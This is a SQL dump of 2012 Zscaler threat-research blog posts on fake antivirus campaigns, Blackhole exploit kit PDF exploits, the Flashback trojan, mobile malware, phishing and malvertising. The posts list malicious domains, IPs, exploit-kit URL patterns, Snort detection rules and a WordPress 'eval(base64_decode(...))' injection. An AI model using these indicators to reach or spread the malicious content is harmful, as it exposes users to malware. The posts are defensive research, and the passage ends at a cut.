INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (303, 'Search Engine Security For Google Chrome', 'Julien Sobrier', 'April 16, 2012', 'Google Chrome has recently added an API to modify HTTP headers. This in turns, made it possible to port Zscaler\'s Search Engine Security add-on from Firefox and Firefox Mobile to Google Chrome.Search Engine Security on the Chrome Web StoreMost hijacked websites used for Blackhat SEO check the Referer header and the User-Agent, to decide whether to redirect the visitor to a harmless spam page or to a malicious domain (Fake AV page, Blackhole exploit kit, etc.). By modifying these 2 headers when the user leaves a Google, Bing or Yahoo! search, Search Engine Security fools the hijacked site into thinking that the visitor is not a real user and therefore avoids redirection to the malicious content.Search Engine Security enabled for GoogleAll the work is done in the background, so it can be tricky to understand exactly what happens, or even if the add-on is working. We have therefore added a small note on the Google/Bing/Yahoo! search result pages to show you whether Search Engine Security is on (default settings) or off (disabled in the options):  Zscaler SES on or Zscaler SES off.Search Engine Security disabled on BingTo understand how the the headers are modified, look for \"referer mobilefish\" in Google after you have installed Search Engine Security. Click on the first link \"Mobilefish.com - Show my IP\". The page will display your User-Agent string and Referer header. With the default settings, the string \"slurp\" is appended to your User-Agent, and the Referer header is removed. These changes are done only when leaving a Google/Bing/Yahoo! search page.You can also enable/disable the various settings on the Search Engine Security options page to see how the User-Agent and Referer strings are affected.Search Engine Security optionsYou can install Search Engine Security for Google Chrome in the Chrome Web Store.', 'Malware', 'https://www.zscaler.com/blogs/research/search-engine-security-google-chrome');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (304, 'Details Of A \"new\" Fake AV Page', 'Julien Sobrier', 'April 13, 2012', 'As I mentioned last week, more Fake AV pages are once again showing up in popular Google searches. Although these malicious pages look the same as they did 2 years ago, the source code is different.     The first thing you notice in the source code is that there is no obfuscation at all. The attacker is not trying to hide anything: CSS is inline, plain-text JavaScript (no obfuscation, no minification or packing) is inline, etc. That makes the pages very easy to track and block. Or it should....however, antivirus vendors are still not able to block the Fake AV executable with an acceptable level of accuracy. As you can see in the video, only 5 out of 42 antivirus engines find anything suspicious. You can easily download the executable with a simple wget command, so it is not hard to gather these samples         	  		  			  		  		  			Download the malicious executable with wget  		  	        The source code is fairly simple. Another interesting fact is that Firefox is handled differently by the page compared to other browsers, meaning that different JavaScript code is run, but the end result is the same as on the other web browsers.                	  		  			  		  		  			Fake AV page  		  	        The JavaScript function used to trigger the malicious file download is called google(). It creates an IFRAME pointing to the malicious executable, which triggers the download prompt without having to leave the page.                          	  		  			  		  		  			The google() function  		  	      The animations (blinking text, scanning progress bar, etc.) are all done with animated GIF files.    Overall,these Fake Av pages are low tech, very unique and very easy to track .... but still very effective. Desktop antivirus, often the only protection available to home users, generally fails to block the page and fails again to block the malicious executable.', 'Analysis;AntiVirus', 'https://www.zscaler.com/blogs/research/details-new-fake-av-page');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (305, 'PDF Exploits Targeted Through Blackhole Exploit Kits.', 'ThreatLabz', 'April 09, 2012', 'PDF exploits have been targeted by Blackhole exploit kits for some time now. The Blackhole exploit kit will deliver various malicious PDF files to a user if the victim is running a potentially vulnerable version of Adobe Reader. When these PDFs are opened through Adobe Reader, a known vulnerability is exploited which will then compromise the user’s machine.    Let’s look at the de-obfuscated portion of the Blackhole exploit kit. The exploit kit for this sample was delivered from “flightpub.net/l/src.php?case=46677c190b37f2d6”.    The de-obfuscated code above shows how an iFrame of 1x1 pixels is created to load a malicious PDF file residing at “./content/ap1.php?f=97d19::182b5” or “./content/ap1.php?f=97d19::182b5”, depending upon the version of Adobe reader installed. These two files are hosted on same the domain - “flightpub.net”.    The absolute paths of the malicious files are,    hxxp://flightpub.net/l/content/ap1.php?f=97d19::182b5 and  hxxp://flightpub.net/l/content/ap2.php?f=97d19::182b5    For analysis purposes, we can manually downloaded the aforementioned PDF files. The PDF files contain a JavaScript object, which contains obfuscated JavaScript, as shown below:             The JavaScript code loops through array ‘ar’ and converts each element of the array with logic included in function ‘test2()’. The de-obfuscated code targets a three year old vulnerability in Adobe Acrobat reader.    Let’s take a look at the some of the de-obfuscated code,            A stack based buffer overflow vulnerability exists in the ‘getIcon()’ method, which is detailed in CVE-2009-0927.    This vulnerability is widely targeted by various versions of the Blackhole exploit kit. I have seen different variants of the payload URL used to host these PDF exploits. The URL pattern changes with different variants of the exploit kit. The different URL path patterns seen so far are:    /content/ap1.php?f=97d19::182b5  /content/ap2.php?f=97d19::182b5  /content/fdp1.php?f=63  /content/fdp2.php?f=63  /content/adfp2.php?f=193  /content/adfp1.php?f=193    The common pattern in the above URL paths are ‘/content/’ and ‘.php?f=’. By identifying these common patterns one can write a network signature on URL strings to catch these malicious URLs.    Let’s take a look at couple of snort signatures for detecting these malicious URL’s.    alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:\"ET CURRENT_EVENTS Blackhole Acrobat 1-7 PDF exploit download request 3\"; flow:established,to_server; content:\"/fdp1.php?f=\"; http_uri; reference:md5,8a33d1d36d097ca13136832aa10ae5ca; reference:cve,CVE-2011-0611; classtype:trojan-activity; sid:2014052; rev:2;)    alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:\"ET CURRENT_EVENTS DRIVEBY Blackhole PDF Exploit Request /fdp2.php\"; flow:established,to_server; content:\"/fdp2.php?f=\"; http_uri; reference:md5,8a33d1d36d097ca13136832aa10ae5ca; reference:cve,CVE-2011-0611; classtype:trojan-activity; sid:2014035; rev:2;)    Most of the vulnerabilities targeted by various exploit kits are public. Making sure all of your applications are updated regularly with the latest security updates will go a long way in helping to keep your computer secure.    Pradeep', 'Analysis;Exploit Kit;Vulnerability', 'https://www.zscaler.com/blogs/research/pdf-exploits-targeted-through-blackhole-exploit-kits');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (306, 'Blackhat SEO Back In Google Searches', 'Julien Sobrier', 'April 06, 2012', 'In 2011, Blackhat SEO links were pretty much absent from the most popular searches in Google. Instead, Blackhat SEO was used to target more specific searches. The technique heavily used to poison the searches for buying software online with hundreds of fake online stores.Blackhat SEOThings are starting to change in 2012. I ran some numbers on Google searches for the month of March 2012 and found:117 malicious domains, including 66 serving Fake AV pages and 35 fake online store domains1,142 spam/malicious links in Google searches, including 299 links leading to a Fake AV pageThe number of new domains hosting fake online stores is slowly decreasing, I found only 6 new domains in March, but the number of Fake AV sites has increased significantly.While Google search results leading to Fake AV pages used to be caused primarily by hijacked sites that were redirecting the entire site to a malicious domain, the current increase is due mostly to the targeted use of Blackhat SEO for popular searches, as it was in 2010. The big difference with current results compared to those in 2010 is that Google is doing a much better job at flagging these malicious links: 294 of the 299 search results leading to a Fake AV page were flagged by Google.The spammers are still able to get their spam pages on hijacked sites to appear on the first result page for popular searches such as \"puerile in a sentence\" and \"edhelper password\".Malicious link in first result pageThe technique used is still the same. Websites are hijacked and new pages are added. Each new page is targeting a popular search term trending in Google Hot Trends. Pages from different hijacked sites are linked together to increase their rank.As I mentioned in an earlier post, the Fake AV pages still look the same, but surprisingly, use new source code with no obfuscation in most cases.Fake AV instead of Fake storeThe second trend I see is the increase in Fake AV links in searches related to software sales, like \"Buy Windows 7\". This is something I noted last year. The increase in search results leading to malware (Fake AV pages and others) where you would usually find fake stores is alarming because Google has not yet cleaned up these results. None of the spam links sending users to fake stores are flagged by Google.Search Engine SecurityThe best tool to protect yourself against Blackhat SEO is Search Engine Security, a free browser extension from Zscaler. It was available for Firefox only, but versions for Google Chrome (currently waiting for approval in the Google Chrome Store) and Internet Explorer will be available shortly.', 'Malware', 'https://www.zscaler.com/blogs/research/blackhat-seo-back-google-searches');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (307, 'Mac OSX Flashback Confusion And Hype', 'ThreatLabz', 'April 06, 2012', 'We, like most in the security community, have been following the latest developments with the Mac OS X Flashback Trojan and it\'s exploitation of the recently patched Java vulnerability (CVE-2012-0507).  This story has a lot of interesting twists and turns:\r\n\r\n	The Flashback Trojan is a relatively new Trojan family, appearing on the scene late last summer/early September 2011.  Since it\'s inception, there have been numerous variants - moving from being a pure social engineering play (appearing to be a fake Flash update) to leveraging exploits.  The rapid evolution of this family has made it a little confusing to stay on top of. There were reports of Twitter being used for C&C updates as part of an early March variant. However, it is unclear if this communication avenue was ever actually used by the botherder.\r\n	The latest variants of the Trojan, namely variant I and variant K, both exploit Java vulnerabilities- CVE-2011-3544 (Flashbak.I) and CVE-2012-0507 (Flashback.K). Oracle patched this latest vulnerability back in mid-February. Their CVSS risk matrix for this vulnerability can be seen below:\r\n	 \r\n	\r\n	Apple initially released a patch for the vulnerability April 3rd, six weeks after Oracle and then quietly announced on April 5th an update to the patch due to a few issues: \r\n	Then there is the question of what the Trojan does/is doing. It has the capability to modify web pages (web-injects) viewed in Safari, based on a configuration file received from the C&C.  However, it is not clear exactly what the web-injects will be used for. Similar functionality exists in many other bots, such as Zeus and is typically used to include additional form fields on banking sites to gather additional information such as SSN, debit card number, pin, etc.\r\n	Finally, there is the question of how widespread the infections are.  Dr. Web has reported 550K infections.  Which would certainly rank this among the largest botnets. Some have claimed the numbers to be over-hyped or mis-counted.  However, Kaspersky recently published a blog confirming the and even upping the number to 600K+ after sink-holing a C&C.\r\n\r\n\r\nFrom the perspective of Zscaler\'s Enterprise customers - we are indeed seeing Flashback infections, many of which include older variants of the Trojan. One C&C from an older variant for example that we are seeing, which has not been reported in the other stories is:\r\n\r\n \r\n\r\nASDFUH982HDODJC.COM\r\n\r\n \r\n\r\nHTTP GET requests to this and other related C&Cs is done with a base64 encoded User-Agent (UA) that includes the CPU, hardware UUID, OS version, and other system/infection details - so each victim has a unique UA when connecting to the C&C.  The latest variant does not appear to use this same UA encoding.\r\n\r\n \r\n\r\nMost/all of the malicious \".rr.nu\" sites on 95.215.63.38 that hosted malware associated with the attack, are now down (resolve to 127.0.0.1).  Below is a screenshot of code from one website hosting the Java applet which exploited CVE-2012-0507:\r\n \r\n\r\n\r\n\r\n\r\n\r\nThe site meta-refreshes to a blank page if JavaScript is disabled or NoScript is detected and uses a cookie to mark whether or not to embed the malicious Java applet.\r\n\r\n \r\n\r\nDoing domain/hosting analysis, other domains are believed to be related in the campaign not listed in the Dr. Web or F-Secure reports include:\r\n\r\n\r\n\r\n\r\n	bodyrocks.rr.nu\r\n	femalebodyinspector.rr.nu\r\n	johncartermovie2012.com\r\n\r\n\r\n\r\n\r\nWe are seeing a number of the related websites on 67.208.74.71 (InfoRelay Online Systems).  There are a large number of interesting looking/suspicious domains that are or have have resolved here, including numerous \".rr.nu\" sites.\r\n\r\n \r\n\r\nWhile this has been an interesting and in some ways confusing (due to mis-information and hype) campaign to follow, we are not currently seeing an enormous number of infections. This may however be due to our enterprise customer base which tends to have a lesser Mac install base or better patch management processes. That being said though, another interesting bit of information comes from looking at Alexa data showing the list the top \".rr.nu\" sites here (screenshot below):\r\n\r\n\r\n\r\nAll of the top sites are related to this campaign, for example:\r\nustreambesttv.rr.nu\r\n\r\nfemalebodyinspector.rr.nu\r\n\r\ngangstasparadise.rr.nu\r\n\r\nustreamtvonline.rr.nu\r\n\r\nmystreamvideo.rr.nu\r\n\r\nyoutubevideos.rr.nu\r\n\r\nironmanvideo.rr.nu\r\n\r\nWe\'ll close out with statistics on the browser plugins that we are seeing among our enterprise customer base. These stats were collected by querying the browser DOM during customer-logins, which allows us to identify browser plugins/extensions.  We are currently seeing only about 6% of Enterprise systems with an out dated version of Java.  Percentages of out-dated versions of Acrobat for example are much, much higher.', 'Apple;Malware', 'https://www.zscaler.com/blogs/research/mac-osx-flashback-confusion-and-hype');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (308, 'On-Going Dynamic FakeAV Campaign', 'ThreatLabz', 'March 30, 2012', 'Looking back on traffic from this week, I noticed a large spike in the number of companies accessing free TLD / Dynamic DNS related sites.  Digging deeper it appears that a malware campaign tied to massive WordPress compromises was the culprit.  This is a very widespread malware campaign that remains live / on-going and is currently redirecting to FakeAV websites.  The campaign is making use of auto-domain generation and auto-updating of infected sites to change the embedded link with every visit.  Some major infected sites that remain live include: psoftsearch.com and sql-plus.com (careful if you visit these sites as they are currently infected).  We are in the process of reaching out to victim sites and assisting with handling the incident.  Here are the initial details:There were over 100 of our customers attempting to access a large number of websites on a handful of IPs with domains matching the pattern:[3-6 random letters][2 digits][3-6 random letters].rr.nuGiven the very, very large number of domains used, this has to be some auto-domain generation/registration algorithm used in this campaign.The pages accessed in the campaign includes:/n.php?h=1&s=mm/mm.php?d=x1/nl.php?p=dTracing referrer strings in our logs, here is one live example:www.psoftsearch.com/peoplebooks/  (infected PeopleSoft search site)-->tank95ersfl.rr.nu/mm.php?d=x1-->tank95ersfl.rr.nu/n.php?h=1&s=mm-->protectcustodianmonitor.info/39f678a0d39279b6/3/-->protectcustodianmonitor.info/39f678a0d39279b6/3/setup.exeFakeAV page that dropped setup.exe:MD5: 153ae4d1813c6d29a7809a62ff23f84cVirusTotal reports 2/42 A/V vendors detect (very, very poor detection)I re-downloaded the malware sample a few seconds later and the MD5 was immediately different.Also a few seconds later, I re-visited the above site and the embedded link had already changed:I refreshed the page, and sure enough the embedded link changed again.  Aside from the hosting IPs, this appears to be a dynamic FakeAV campaign.protectcustodianmonitor.info resolves to 64.120.207.106 (HostNOC)Based on other domains on this IP, this will be an IP that you\'ll want to blacklist - there are numerous other FakeAV sites hosted here (see list below).It looks like the primary hosting IP of the \".rr.nu\" redirect changes each day, for example:194.28.114.103 and 194.28.114.102 used in an earlier Sucuri post on this.March 27 it was: 195.88.181.112March 30 (today) it is: 91.230.147.204A number of pages on sites have been compromised to drive this campaign.  For example:www.psoftsearch.comwww.sql-plus.comwww.frozencodebase.comwww.megafuentes.comwww.sdamned.comgenaud.netwww.pumpkinpatchdaycare.inindianmuslims.inInfected websites have injected \"eval(base64_decode(...));\" statements in their wp-config.php and other WordPress .php files to communicate back to a command and control to retrieve a list of websites to inject these \".rr.nu\" site inclusions into pages.---195.88.181.112 hosting information:inetnum:  195.88.181.0 - 195.88.181.255netname:  INET4YOUdescr:       PE Bogaturev Sergey Anatolievichcountry:    RUperson:          Bogaturev Sergeyaddress:         RU, Gornuy Shit, Komsomolskiy str.phone:           +7(495) 324-35-69route:           195.88.181.0/24descr:           Subnet for servers and VPSorigin:          AS57621mnt-by:          INET4YOURU-MNTroute:           195.88.181.0/24descr:           Client_TC_WIFIorigin:          AS57189mnt-by:          COMCORNET-MNT---91.230.147.204 hosting information:inetnum:         91.230.147.0 - 91.230.147.255netname:         zuzu-netdescr:           OOO \"Aldevir Invest\"country:         RUperson:          Krutko Evgeni Yurevichaddress:         192012, St.-Petersburg, Chernova ul., 25, office 12phone:           +7812850202e-mail:          aldevirinvest@lenta.ruroute:           91.230.147.0/24descr:           Route for DCorigin:          AS5508mnt-by:          zuzu-mnt---protectcustodianmonitor.info domain information:Registrant Name:Leah  CarandiniRegistrant Street1:54 Ridge RoadRegistrant City:CordalbaRegistrant State/Province:QLDRegistrant Postal Code:4660Registrant Country:AURegistrant Phone:+61.733106403Registrant Phone: gapes@cutemail.org---Other related FakeAV sites that resolve / resolved to 64.120.207.106:agentcleanerrescue.infoagentkeeprisks.infoagentonlineinspector.infoareon-linescan.infoavdefendqueerprocess.infocleanavcenter.infocleanerspywaresecurity.infocleanprotectionspyware.infocomputerinformationthreat.infocontrolpcon-line.infocontrolsafetystability.infodatasaverprotect.infodebuggerrisksfirewall.infodebugscannerhazard.infodebugvulnerabilityfirewall.infodefenderoptimizermonitor.infodefendtasksspyware.infodelivererdangerkeep.infodelivereron-linepc.infodelivererpreventionthreat.infodelivererworms.infodetectdeliverertrojans.infodetectionprotection.infoefficiencyprotectordefender.infoguarantorthreatcenter.infoguarantorwarderdata.infohighcleantasks.infoinspectionprotectprotection.infokeepcenteron-line.infokeeperdetectormonitor.infolowhighworry.infolowwormstesting.infomicrosoftdatacenter.infooptimizerscanningpc.infoperilsthreatworry.infopreventiondebuggercenter.infoprotectcustodianmonitor.infoprotectionvulnerabilityantivirus.infoprotectorsolutionav.infoprotectsecurityanalysis.infoprotectwarderav.infoqueerprocesscentersolution.infoqueerprocessdetectionon-line.infoqueerprocesshazardmonitor.inforeliabilitydefenderon-line.inforemedyscannerprevention.inforisksbrittlenesssafety.infoscannerfirewallrescue.infoscansupervisionprotection.infosecurityavdebugger.infosolverqueerprocessinformation.infosolverremedylow.infospywareantivirusworry.infostabilitydatadetection.infosystemminimizeranalysis.infotaskssafetyremedy.infotestersolutionperils.infowarderdetectionkeeper.infowarderinspectionantivirus.infowarderrescuescan.infowindowsservantdefend.infowindowssolutionprotect.infowormsdefenderagent.infowormsminimizerdanger.infowreckminimizerprotection.info', 'Malware', 'https://www.zscaler.com/blogs/research/going-dynamic-fakeav-campaign');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (309, 'My Experience Wirting An Add-on For Internet Explorer', 'Julien Sobrier', 'March 27, 2012', 'I\'ve released my first add-on for Internet Explorer and I\'ve almost finished a second one. Developing for Internet Explorer was a very different experience than developing for the other browsers I\'ve worked with before - Firefox, Firefox Mobile, Google Chrome, Safari and Opera.\r\n\r\nOverall Architecture\r\n\r\nInternet Explorer extensions are called Browser Helper Objects (BHO). They are libraries (DLL) implementing a specific interface. They must be registered as a BHO through a registry key in order to be used by Internet Explorer.\r\n\r\nThe BHO is loaded per tab or window, meaning there is no built-in communication between tabs/windows. BHOs can interact with the browser and the document through native code or injected JavaScript.\r\n\r\nBHOs can be written in C++, C# or VB.Net. Since I\'m most familiar with C#, this is the language I\'ve used. Unfortunately, there are many limitations with .Net based BHOs:\r\n\r\n	The BHO name, displayed in the Internet Explorer \"Manage Add-on\" page, displays the namespace of the application. I could not therefore display \"Zscaler Safe Shopping\", so I had to cheat and use Zscaler as the namespace, and SafeShopping as the main class name to display \"Zscaler.SafeShopping\". (see DUcer\'s comment below)\r\n	Many important functions are not implemented in C# and unmanaged C++ code has to be imported.\r\n	Internet Explorer is very picky about performance - if an add-on takes more then 0.20 seconds to load, IE suggests to users that they disable the plugin (see more details below). Due to the fact that .Net add-ons require IE to load the .Net framework, it is pretty much impossible to stay below this limit.\r\n\r\nBecause the extensions are comprised of compiled code, I could not download extensions to check out their source code as examples, unlike extensions for other browsers, which are written in JavaScript. In addition, Microsoft has only high-level documentation about BHOs and very few code examples (with most leveraging C++).\r\n\r\nProtected mode\r\n\r\nStarting with Windows Vista and Internet Explorer 7, Internet Explorer works in Protected Mode by default. This means BHOs are limited in the places they can read/write to disk and read/write to the registry. You need to call special functions to know where you are allowed to write to the disk, but these functions are available in C++ only. I had to use a mix of hardcoded values and unmanaged C++ DLL import to add all necessary functionality.\r\n\r\nBecause there are no built-in debugging functions to understand what is going on inside the extension, and limited documentation from Microsoft, it took me quite a while to understand how to deal with Protected Mode.\r\n\r\nInconsistent environments\r\n\r\nOn other platforms, extensions are relatively compatible between browser versions and operating systems. With Firefox extensions, for example, it doesn\'t matter if the browser is running on Linux, Windows 95 or Mac OS X. These browsers are also very good at maintaining forward compatibility: extensions working on one version usually work fine on newer versions of the same browser. Internet Explorer is a different beast.\r\n\r\nSome of the API belongs to the Windows OS, while other portions belong to Internet Explorer. For example, Protected Mode exists on IE 7 on Windows Vista, but not on Windows XP. The API to manage disk access is also different on the two OSs. Calling Windows Vista\'s API will crash Internet Explorer on Windows XP, for example. Add-ons are definitely not forward compatible.\r\n\r\nSome API calls also get \"randomly\" broken. For example, the event BeforeNavigate2 is broken on Windows 7. This was reported during for Release Candidates, but never fixed and the event is not triggered anymore.\r\n\r\nNo love for extensions\r\n\r\nMicrosoft does not seem to have much love for browser extensions. In fact, I think they actually hate them!\r\n\r\nThere is no good website to download IE extensions. The official Microsoft website, Internet Explorer Gallery, contains very few extensions. Add-ons are not even shown on the front page, instead they promote pinned sites (introduced with IE 9)\r\n\r\nDevelopers don\'t get much love either. In addition to the problems and limitations listed above, the add-on infrastructure in Internet Explorer is very weak. Developers have to write their own installer to install and register their BHOs. They also have to write the uninstaller, as IE lets users disabled BHOs, but not uninstall them. There is no simple way of adding an option page for to configure the extension either.\r\n\r\nIf this was not enough to discourage add-on developers, IE regularly asks users whether they want to uninstall add-ons. Even if all add-ons are loading under 0.200 seconds, Internet Explorer still suggests that the add-ons be disabled to improve the start up time!\r\n\r\nA Bad Reputation\r\n\r\nBHO is a dirty word. If you look for BHO in Google, most search results are about how to remove malware installed as a BHO.\r\n\r\nUsers are also more wary, as they should be, of downloading executables that must be executed outside of their browser, and require Admin rights to register themselves, as opposed to Firefox .xpi files, which are handled entirely inside the browser.\r\n\r\nReferences\r\n\r\nIf I have not yet discouraged you to write a .Net BHO, here are a couple of references I used:\r\n\r\n	StackOverflow: the BHO tag has only 249 questions, but still a good source of information\r\n	The Code Project has several tutorials and code samples\r\n	vcsjones with 5 blog posts about managed BHO\r\n	Free VPC images to test your add-on different versions of Windows and Internet Explorer\r\n	MSDN documentation of the WebBrowser class', 'Microsoft', 'https://www.zscaler.com/blogs/research/my-experience-wirting-add-internet-explorer');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (310, '\"Super Bowl\" And \"March Madness\" In The Enterprise', 'ThreatLabz', 'March 20, 2012', '3/26 Update: I was approached and asked to run stats to do a bit of comparison and contrast with Sports traffic from last year - with the goal in mind to identify if there was a noticeable percentage increase in Sports (March Madness) this year compared to last year.  There was a two day difference from March 2011 to 2012 for the tournament dates - these are noticeable in the tracked stats.  The data shows only a slight increase (<1%) in March Madness traffic this year compared to last year - in general this appears to be a fairly static and expected event within Enterprise traffic.   With the Super Bowl in early February and the NCAA basketball tournament (\"March Madness\") sports are a major focus of attention in Quarter 1.  That means a lot of bandwidth consumed by the enterprise and time spent by employees on this subject.  One report calculated that an estimated $1.7B is to be lost in productivity at the office during this March Madness.  Even if sports are not your thing, you may find yourself participating in an office pool surrounding the Super Bowl or March Madness.  When I was filling out my bracket this year, I found myself on some \"gambling\" web-sites to do some quick research on team odds in the tournament (not that it helped my bracket any).  I was curious how much bandwidth we saw across our enterprise customers related to sports and gambling for these major Q1 sporting events and to also see if there was any correlation.  For those interested in tracking this subject, here are my findings from our large, diverse, enterprise customers:The above blue line represents gambling traffic as a percentage of its total seen thus far for the quarter, and the red line is sports traffic as a percentage of its total seen thus far for the quarter.  The cyclic nature of our data-set is because this is from our enterprise customers -many of which have less employees working on weekends.  (Date periods are related to PST time)There were not large noticeable spikes in sports or gambling traffic observed in the enterprise during the NFL playoffs or Super Bowl - likely due to the fact that the NFL games are on the weekend and toward the end of the season may have a more regional versus global fan base. However, there was a very noticeable increase in traffic surrounding March Madness - particularly during the 2nd round of games, several of which are televised during US work hours.  Specifically the start of March Madness had about a 74% increase in sports related traffic from the Super Bowl.  Throughout our Q1 data-set we see that gambling closely follows the traffic patterns related to sports.  In the case of the noticeable spike in sports traffic, we see a similar related pattern increases in gambling traffic.  One major exception related to gambling was the period of Feb 20 -22.  While most of the baseline gambling traffic are online casinos and gambling affiliates -- looking more closely at the website paths visited related to gambling within this period determined that this anomaly was caused due to the ICC Cricket World Cup in which many of our Australian and Indian customers were following the games.Chances are that traffic from your enterprise participated in one or more of these events during this Q1.', 'Analysis', 'https://www.zscaler.com/blogs/research/super-bowl-and-march-madness-enterprise');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (311, 'Zscaler Safe Shopping For Internet Explorer', 'Chris Mannon', 'March 19, 2012', 'Zscaler Safe Shopping, the browser extension that warns users when they visit a fake store or compromised store, was Firefox, Google Chrome, Safari and Opera. It is now available for Internet Explorer 6 to 9 (Windows XP, Vista and 7). This is the first extension we released for Internet Explorer, and hopefully not the last one. You can download it here.Zscaler Safe Shopping warning in Internet ExplorerFake stores are still prevalent in Google searches for buying software online. If you get redirected to one of the fake store, a banner will be displayed at the top of the page to let you know the the website is not safe. We update the blacklist of fake and compromised stores regularly.Browser Helper ObjectInternet Explorer extensions are called Browser Helper Object (BHO). Unlike all the other major browsers, the add-on infrastructure in Internet Explorer is very incomplete. Internet Explorer does not offer a way to easily install add-ons, to update them, or to configure them. Instead, add-ons are treated as regular Windows program. Zscaler Safe Shopping comes in the form of executable to install and register the BHO. You can disable add-ons from within Internet Explorer, but you have to use the Control Panel to remove them completely from your system.Zscaler Safe Shopping installerZscaler Safe Shopping installedThe executable required administration rights to register itself as an Internet Explorer add-on by modifying the registry. Although the add-on appears in Internet Explorer right after the installation, a restart of Internet Explorer is required to activate the plugin.You can download Zscaler Safe Shopping from our website. I will talk more about developing BHO in later posts.', 'Microsoft', 'https://www.zscaler.com/blogs/research/zscaler-safe-shopping-internet-explorer');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (312, 'Malware Campaign Targeting Opera Mobile', 'Julien Sobrier', 'March 14, 2012', 'I\'ve stumbled upon hundreds of links targeting Opera Mobile users, to trick them into installing a malware on the device.The links are in the form of:hxxp://geqe.net/opera_mini/1965/opera_mini.auto#phpsessid=85cfe7f19a08b6387d0441a9d949bb95Each has a different phpsessid value. The domain was registered last month (02/12/2012) and does not seem to host any legitimate content.These pages redirect to another domain, mskmarkets.ru (hxxp://mskmarkets.ru/l.php?l=o4&r=2695&a=29#phpsessid=afe9720a74a56800a2bd682b171e9914) where users are warned in Russian that their browser is out of date:WARNING! An update your browser! Your browser version is outdated, your phone is at risk of infection by dangerous virus!  We strongly recommend that you upgrade your browser.  To update, click Update.hxxp://geqe.net/opera_mini/1965/opera_mini.auto#phpsessid=85cfe7f19a08b6387d0441a9d949bb95Note that a Google Chrome favicon is used and the page leverages the same theme and icons as Opera Mobile. The source code has multiple references to Opera (CSS, links, etc.) and targets WAP-enabled devices.When the user clicks on the Refresh button, the file browser_update.jar gets downloaded (and possibly installed, I don\'t have the right device to test). This malicious Java application is currently flagged by 8 of 43 AV engines as an SMS sender. This type of malware is very common on mobile devices. They are used for spam or contact surcharged phone numbers.According to Wikipedia, Opera has a huge market share in Russia and Eastern Europe, with more than 36% of the browser market (only 2.7% world-wide).With the lack of effective AV and other security tools on smartphones, especially on low-end devices, mobile users must be very careful about downloading and installing applications, especially outside of the official app stores.', 'Mobile Malware;AntiVirus;Malware', 'https://www.zscaler.com/blogs/research/malware-campaign-targeting-opera-mobile');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (313, 'Free Provider X90x.net Hosting Numerous Facebook Phishing Sites', 'Chris Mannon', 'March 13, 2012', 'In the long history of free hosting and DNS providers abused (co.cc, pastehtml.com, etc.), x90x.net can now be added to the list, as it is being used to host many Facebook Phishing sites in a variety of languages:    	faceb000k.x90x.net  	jebemtakra-pisdfa-asdasdsds-ddfs.x90x.net  	mesnaindustrija-goranovic-m-e-s-n-a.x90x.net  	dft3.x90x.net/fbcd.html  	d3xt0pcr3w.x90x.net  	etc.        	  		  			  		  		  			www.mesnaindustrija-goranovic-m-e-s-n-a.x90x.net  		  	        	  		  			  		  		  			d3xt0pcr3w.x90x.net  		  	        	  		  			  		  		  			dft3.x90x.net/fbcd.html  		  	        	  		  			  		  		  			x90x provides free hosting on their sub-domain  		  	    A little bit more research showed that many other types of scams and spam content are hosted on x90x.net sub-domains. Here are a few of them:       	Fake Google page        	  		  			  		  		  			mygoogle.x90x.net  		  	     This site does not appear to be functional.      	Links to Canadian Pharmacies        	  		  			  		  		  			vmdygoa.x90x.net  		  	        	 forex.com phishing site        	  		  			  		  		  			jasf.x90x.net/tag/chase/  		  	        	Porn (no screenshot!)  	and much more....    The hosting provider is also used by legitimate sites.  It is very risky to host any important website with a free provider which is going to get abused over and over. co.cc has been blacklisted by Google Safe Browsing in the past, meaning all Firefox/Safari/Chrome users were prevented from visiting any of the websites hosted under co.cc. I believe that a $10/year domain name is really a must for any website. Do not rely on a free domain such as those provided by x90x.net that could soon be blacklisted.', 'Uncategorised', 'https://www.zscaler.com/blogs/research/free-provider-x90xnet-hosting-numerous-facebook-phishing-sites');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (314, 'Anatomy Of An On-going Malvertising Campaign', 'Julien Sobrier', 'March 13, 2012', 'During the course of investigating an open incident ticket with a customer, we uncovered what is a common occurrence on the web - legitimate sites linking in third-party content (often advertisements or banners) that ultimately drives the victim browser to an exploit kit.\r\n\r\n \r\n\r\nHere is the chain of events that we observed:\r\n\r\n\r\n\r\n	User browsed to: www.thenewsvault.com\r\n	The site included content from: www.tvshark.com/read/?art=arc8755\r\n	Which included content from: www.tvshark.com/abritebtm300.html\r\n	Which linked in what appears to be an advertisement iframe: ads-svx.httpads.com/adserver/cached_iframe?guid=16ce4035-ded0-49c8-8515-8e234cbb2b8b\r\n	That loaded the \"advertisement\" rotator from: c1.zxxds.net, which includes a number of pages, the main one being: /jsc/c1/ff2.html?n=1721;c=3;s=4;d=9;w=300;h=250. Some online references show c1.zxxds.net as having a poor reputation, including involvement with adware.\r\n	The c1.zxxds.net site then loaded: chgdjk.info/nw87b6rh/counter.php?id=5 and a number of other pages on this domain which are allegedly exploit kit driven.\r\n	From the response size in the logs, we can see that the exploit kit payload page was: chgdjk.info/nw87b6rh/?11ecfa793c76017554490058535a0301030355535d5555090a05035456510f0a00;1;10\r\n\r\n\r\nAt the time of the transactions, chgdjk.info resolved to 208.76.54.210. Doing some Google searching, we found that the site TheTVDB.com linked in content (probably in the same way) to an exploit kit hosted on 